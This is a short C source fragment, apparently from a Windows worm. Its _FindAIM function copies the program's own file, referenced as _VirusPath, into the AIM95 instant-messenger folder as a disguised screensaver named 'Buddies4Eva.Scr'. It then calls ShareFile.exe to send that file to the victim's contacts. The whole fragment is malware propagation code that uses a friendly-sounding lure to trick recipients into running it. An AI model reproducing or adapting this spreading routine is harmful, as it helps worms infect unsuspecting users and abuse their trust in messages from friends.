#include "data_globals.h"
#include <string.h>
#include <windows.h>

void _FindAIM(void)
{
    // Build the path: \Program Files\AIM95\Buddies4Eva.Scr
    strcpy(_AimFull, "\\Program Files\\AIM95\\Buddies4Eva.Scr");

    CopyFileA(_VirusPath, _AimFull, 0);
    _chdir("\\Program Files\\AIM95\\");
    system("ShareFile.exe \\Progra~1\\AIM95\\Buddies4Eva.Scr");
}
